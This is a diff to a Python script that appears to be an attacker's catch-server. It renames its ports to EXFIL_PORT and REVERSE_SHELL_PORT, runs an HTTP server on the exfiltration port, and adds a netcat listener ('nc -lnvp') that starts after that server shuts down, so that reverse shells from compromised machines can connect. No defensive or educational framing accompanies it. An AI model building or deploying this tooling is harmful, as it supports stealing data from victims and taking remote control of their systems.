@@ -5,14 +5,17 @@ import os
 import signal
 import sys
 import cgi
+import subprocess
+import time
 
-if len(sys.argv) != 2:
-    print(f"Usage: {sys.argv[0]} <PORT>")
+if len(sys.argv) != 3:
+    print(f"Usage: {sys.argv[0]} <EXFIL_PORT> <REVERSE_SHELL_PORT>")
     sys.exit(1)
 
 IP = "0.0.0.0"
 try:
-    PORT = int(sys.argv[1])
+    EXFIL_PORT = int(sys.argv[1])
+    REVERSE_SHELL_PORT = int(sys.argv[2])
 except ValueError:
     print("[!] Port must be an integer.")
     sys.exit(1)
@@ -127,16 +130,26 @@ class CustomHandler(http.server.BaseHTTPRequestHandler):
 def shutdown_server():
     os.kill(os.getpid(), signal.SIGINT)
 
+def start_nc_listener(port):
+    print(f"[+] Starting netcat listener on port {port}...")
+    try:
+        subprocess.run(["nc", "-lnvp", str(port)], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Error starting netcat: {e}")
+    except KeyboardInterrupt:
+        print(f"[*] Netcat listener stopped.")
+
 if __name__ == "__main__":
-    with socketserver.TCPServer((IP, PORT), CustomHandler) as httpd:
+    with socketserver.TCPServer((IP, EXFIL_PORT), CustomHandler) as httpd:
         try:
             print(banner)
-            print(f"[+] Server is now listening on {IP}:{PORT}...")
+            print(f"[+] Server is now listening on {IP}:{EXFIL_PORT}...")
             try:
                 httpd.serve_forever()
             except KeyboardInterrupt:
-                print("[*] Server Shutting Down....")
                 httpd.server_close()
         except KeyboardInterrupt:
             http.server_close()
-
+        finally:
+            time.sleep(3)
+            start_nc_listener(REVERSE_SHELL_PORT)
